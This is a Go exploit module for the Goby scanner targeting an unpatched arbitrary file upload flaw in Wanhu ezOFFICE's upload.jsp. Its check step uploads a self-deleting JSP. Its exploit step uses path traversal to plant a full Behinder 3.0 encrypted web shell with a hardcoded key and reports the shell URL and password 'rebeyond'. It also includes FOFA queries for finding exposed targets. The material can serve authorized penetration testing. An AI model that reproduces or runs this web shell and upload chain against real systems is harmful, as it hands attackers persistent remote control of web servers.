package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Wanhu OA upload.jsp Arbitrary File Upload Vulnerability",
    "Description": "<p>Wanhu ezOFFICE collaborative management platform is a comprehensive information basic application platform. </p><p>There is a file upload vulnerability in the Wanhu ezoffice collaborative office system. Attackers can upload files of dangerous types without restrictions, write to the back door, obtain server permissions, and then control the entire web server.</p>",
    "Impact": "<p>There is a file upload vulnerability in the Wanhu ezoffice collaborative office system. Attackers can upload files of dangerous types without restrictions, write to the back door, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The manufacturer has not yet provided a vulnerability patching solution, please pay attention to the manufacturer's homepage for timely updates: <a href=\"http://www.whir.net/\">http://www.whir.net/</a></p>",
    "Product": "Wanhu-ezOFFICE",
    "VulType": [
        "File Upload"
    ],
    "Tags": [
        "File Upload"
    ],
    "Translation": {
        "CN": {
            "Name": "万户 OA upload.jsp 任意文件上传漏洞",
            "Product": "ezOFFICE",
            "Description": "<p>万户ezOFFICE协同管理平台是一个综合信息基础应用平台。&nbsp;</p><p>万户ezOFFICE协同办公系统 upload.jsp 接口存在文件上传漏洞，攻击者可以不受限制地上传具有危险类型的文件，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>厂商尚未提供漏洞修补方案，请关注厂商主页及时更新： <a href=\"http://www.whir.net/\">http://www.whir.net/</a><br></p>",
            "Impact": "<p>万户ezOFFICE协同办公系统存在文件上传漏洞，攻击者可以不受限制地上传具有危险类型的文件，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Wanhu OA upload.jsp Arbitrary File Upload Vulnerability",
            "Product": "Wanhu-ezOFFICE",
            "Description": "<p>Wanhu ezOFFICE collaborative management platform is a comprehensive information basic application platform.&nbsp;</p><p>There is a file upload vulnerability in the Wanhu ezoffice collaborative office system. Attackers can upload files of dangerous types without restrictions, write to the back door, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The manufacturer has not yet provided a vulnerability patching solution, please pay attention to the manufacturer's homepage for timely updates: <a href=\"http://www.whir.net/\">http://www.whir.net/</a><br></p>",
            "Impact": "<p>There is a file upload vulnerability in the Wanhu ezoffice collaborative office system. Attackers can upload files of dangerous types without restrictions, write to the back door, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "FofaQuery": "(banner=\"OASESSIONID\" && banner=\"/defaultroot/\") || (header=\"OASESSIONID\" && header=\"/defaultroot/\")||body=\"/defaultroot/themes/common/common.css\"||body=\"ezofficeDomainAccount\"||title=\"Wanhu ezOFFICE\" || title=\"万户ezOFFICE\"",
    "GobyQuery": "(banner=\"OASESSIONID\" && banner=\"/defaultroot/\") || (header=\"OASESSIONID\" && header=\"/defaultroot/\")||body=\"/defaultroot/themes/common/common.css\"||body=\"ezofficeDomainAccount\"||title=\"Wanhu ezOFFICE\" || title=\"万户ezOFFICE\"",
    "Author": "liuzhenqi@baimaohui.net",
    "Homepage": "https://www.whir.net/",
    "DisclosureDate": "2022-12-02",
    "References": [],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "Behinder3.0",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "CVSSScore": "9.0",
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10968"
}`

	exploitWanHuUploadFile12094817419 := func(u *httpclient.FixUrl, fileContent string) string {
		cfg := httpclient.NewPostRequestConfig("/defaultroot/platform/portal/layout/common/upload.jsp?path=../public/edit/&portletSettingId=1")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary3sqsNyqBAKNHBCyT")
		cfg.Data = "------WebKitFormBoundary3sqsNyqBAKNHBCyT\r\nContent-Disposition: form-data; name=\"uploadfile\"; filename=\"whatever.jsp\"\r\nContent-Type: text/plain\r\n\r\n" + fileContent + "\r\n------WebKitFormBoundary3sqsNyqBAKNHBCyT--"

		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && resp.StatusCode == 200 {
			return regexp.MustCompile("parent\\.afterUpload\\('(.*)\\.jsp'\\);").FindAllStringSubmatch(resp.RawBody, -1)[0][1]
		}
		return ""
	}
	checkWanHuUploadFile109587617491231 := func(u *httpclient.FixUrl, filename string, checkStr string) bool {
		cfg := httpclient.NewGetRequestConfig("/defaultroot/public/edit/" + fmt.Sprintf(filename[0:6]) + "/" + filename + ".jsp")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(u, cfg)
		return err == nil && strings.Contains(resp.RawBody, checkStr)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randStr := goutils.RandomHexString(6)
			checkContent := "<%out.println(\"" + randStr + "\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>"
			filename := exploitWanHuUploadFile12094817419(u, checkContent)
			return filename != "" && checkWanHuUploadFile109587617491231(u, filename, randStr)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if ss.Params["AttackType"].(string) == "Behinder3.0" {
				behinder := "<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>"
				filename := exploitWanHuUploadFile12094817419(expResult.HostInfo, behinder)

				if filename != "" {
					expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/defaultroot/public/edit/" + fmt.Sprintf(filename[0:6]) + "/" + filename + ".jsp\r\n"
					expResult.Output += "Password: rebeyond\r\n"
					expResult.Output += "WebShell tool: Behinder v3.0"
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
